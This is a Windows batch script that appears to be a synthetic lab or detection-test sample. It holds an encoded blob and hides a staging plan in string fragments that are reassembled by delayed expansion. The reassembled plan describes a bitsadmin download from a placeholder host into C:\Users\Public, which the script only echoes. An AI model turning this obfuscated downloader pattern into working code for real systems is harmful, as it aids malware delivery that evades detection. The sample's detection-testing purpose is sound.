@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|add_7
rem HUNTRESS-MATERIAL:=sHarVTbrpjOt1GO7cja0wmbotnejlGaTpnesl3e1x3TjpGczlGfXNme5xmecNWQKR0b7h2dmx2cw12g7h2a1wzOp5TPtlGO2sGczhWf1BXNsN3d0h2fsVTbrpjOt1GO7cja2YTQ6d3e79GRzlHfD22a6oTbthzO3oGN15GcodHdopGRrBnZ15GcodHdop2gsVnd1REbuhGfuVHazZ2e/xWdDCYe7xWemJnaol2czhWbE92dolnbDiDR7VHf2pmZs5Ga7p3gs9Hb1UHc0tGa6tHcpRUest3dotGaDy2cw1mZstHc553Mstnd0xWemxWewxHeqhGR6dHb7p3g4QUf
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "FrAg0=v=1|steps=acquire_remote,write_file|adapter=bitsadmin.exe|stage_"
SeT "FrAg1=count=1|graph=fallback_retry|next_language=none|campaign_id=camp"
SeT "FrAg2=aign-c041ff33df|url=https://c041ff33df.example.invalid/1bf67b45."
SeT "FrAg3=dat|file_path=C:\Users\Public\HuntressLab\stage-c041ff33df.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=e0850fbf"
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "ReCoVeReD="
for %%G in (0 1 2 3) do call set "ReCoVeReD=%%ReCoVeReD%%%%FrAg%%G%%"
exit /b 0
:HUNTRESS_EMIT
echo(!ReCoVeReD!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe acquire https://c041ff33df.example.invalid/1bf67b45.dat to C:\Users\Public\HuntressLab\stage-c041ff33df.dat
exit /b 0
